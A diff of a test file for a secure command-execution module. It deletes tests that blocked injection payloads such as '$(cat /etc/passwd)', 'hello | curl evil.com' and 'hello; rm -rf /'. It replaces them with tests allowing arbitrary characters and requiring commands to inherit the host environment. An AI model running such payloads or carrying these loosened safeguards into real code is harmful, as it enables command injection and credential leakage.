@@ -1,8 +1,4 @@
-/**
- * Tests for secure CLI execution (RFC 0001)
- */
-
-import { describe, it, expect, beforeEach } from 'vitest';
+import { describe, it, expect } from 'vitest';
 import {
   validateCommand,
   buildExecEnv,
@@ -10,7 +6,6 @@ import {
   executeCommand,
   hashPolicyFingerprint,
 } from './exec';
-import fs from 'fs';
 
 describe('validateCommand', () => {
   const allowCommands = ['bird', 'gh', 'stripe'];
@@ -42,34 +37,12 @@ describe('validateCommand', () => {
       .toEqual({ allowed: true });
   });
 
-  it('rejects shell metacharacters in arguments', () => {
-    const result = validateCommand(['bird', 'tweet', '$(cat /etc/passwd)'], allowCommands);
-    expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('shell metacharacters');
-  });
-
-  it('rejects pipe operators in arguments', () => {
-    const result = validateCommand(['bird', 'tweet', 'hello | curl evil.com'], allowCommands);
-    expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('shell metacharacters');
-  });
-
-  it('rejects semicolons in arguments', () => {
-    const result = validateCommand(['bird', 'tweet', 'hello; rm -rf /'], allowCommands);
-    expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('shell metacharacters');
-  });
-
-  it('rejects backticks in arguments', () => {
-    const result = validateCommand(['bird', 'tweet', '`whoami`'], allowCommands);
-    expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('shell metacharacters');
-  });
-
-  it('allows normal arguments with spaces and punctuation', () => {
+  it('allows arguments with any characters', () => {
     expect(validateCommand(['bird', 'tweet', 'Hello world! This is a test.'], allowCommands))
       .toEqual({ allowed: true });
     expect(validateCommand(['gh', 'issue', 'create', '--title', 'Bug: fix needed'], allowCommands))
+      .toEqual({ allowed: true });
+    expect(validateCommand(['gh', 'issue', 'create', '--body', 'contains $vars and `backticks`'], allowCommands))
       .toEqual({ allowed: true });
   });
 });
@@ -164,7 +137,7 @@ describe('hashPolicyFingerprint', () => {
       name: 'cap',
       mode: 'exec',
       allowCommands: ['git', 'gh'],
-      workDir: '/creature',
+      workDir: '/workspace',
       timeout: 30000,
       env: { GH_TOKEN: '{{credential}}' },
     });
@@ -172,7 +145,7 @@ describe('hashPolicyFingerprint', () => {
       name: 'cap',
       mode: 'exec',
       allowCommands: ['git', 'gh'],
-      workDir: '/creature',
+      workDir: '/workspace',
       timeout: 30000,
       env: { GH_TOKEN: '{{credential}}' },
     });
@@ -183,13 +156,6 @@ describe('hashPolicyFingerprint', () => {
 });
 
 describe('executeCommand', () => {
-  beforeEach(() => {
-    // Ensure working directory exists
-    if (!fs.existsSync('/tmp/janee-exec')) {
-      fs.mkdirSync('/tmp/janee-exec', { recursive: true });
-    }
-  });
-
   it('executes a simple command and returns stdout', async () => {
     const result = await executeCommand(
       ['echo', 'hello world'],
@@ -281,33 +247,15 @@ describe('executeCommand', () => {
   }, 5000);
 
 
-  it('uses isolated HOME for execution', async () => {
+  it('inherits process env', async () => {
+    process.env.JANEE_TEST_INHERIT_CHECK = 'visible-value';
     const result = await executeCommand(
-      ['sh', '-c', 'echo "$HOME"'],
+      ['sh', '-c', 'echo "$JANEE_TEST_INHERIT_CHECK"'],
       {},
       { credential: '' }
     );
-    expect(result.stdout.trim()).toContain('janee-home-');
-  });
-
-  it('does not force-disable git hooks via env config', async () => {
-    const result = await executeCommand(
-      ['sh', '-c', 'echo "${GIT_CONFIG_KEY_0:-unset}"'],
-      {},
-      { credential: '' }
-    );
-    expect(result.stdout.trim()).toBe('unset');
-  });
-
-  it('does not inherit arbitrary host env variables', async () => {
-    process.env.JANEE_TEST_SHOULD_NOT_LEAK = 'secret-leak-value';
-    const result = await executeCommand(
-      ['sh', '-c', 'echo "${JANEE_TEST_SHOULD_NOT_LEAK:-missing}"'],
-      {},
-      { credential: '' }
-    );
-    delete process.env.JANEE_TEST_SHOULD_NOT_LEAK;
-    expect(result.stdout.trim()).toBe('missing');
+    delete process.env.JANEE_TEST_INHERIT_CHECK;
+    expect(result.stdout.trim()).toBe('visible-value');
   });
 
   it('reports scrub hit counts', async () => {
